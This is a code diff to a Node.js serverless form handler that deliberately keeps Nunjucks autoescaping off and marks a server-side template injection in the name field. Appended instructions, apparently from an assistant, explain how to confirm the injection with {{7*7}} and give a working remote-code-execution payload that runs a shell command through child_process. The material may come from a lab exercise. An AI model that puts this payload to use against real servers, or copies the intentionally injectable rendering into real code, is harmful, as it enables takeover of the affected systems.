@@ -1,9 +1,6 @@
 const nunjucks = require("nunjucks");
 const { neon } = require("@neondatabase/serverless");
 
-// Configure Nunjucks environment with autoescaping disabled
-const env = nunjucks.configure({ autoescape: false });
-
 module.exports = async (req, res) => {
   if (req.method !== "POST") {
     return res.status(405).send("Method Not Allowed");
@@ -115,6 +112,9 @@ module.exports = async (req, res) => {
 </html>
 `;
   try {
+    // Create environment with autoescape disabled
+    const env = new nunjucks.Environment(null, { autoescape: false });
+    
     // ---- SSTI EXISTS ONLY HERE (NAME FIELD) ----
     const html = env.renderString(template, {
       formId,
@@ -131,3 +131,12 @@ module.exports = async (req, res) => {
     return res.status(500).send(e.message);
   }
 };
+```
+
+**Key change:** Use `new nunjucks.Environment(null, { autoescape: false })` instead of `nunjucks.configure()`.
+
+Now test with `{{7*7}}` - it should render as `49`.
+
+Then try this RCE payload:
+```
+{{range.constructor("return process.mainModule.require('child_process').execSync('id').toString()")()}}
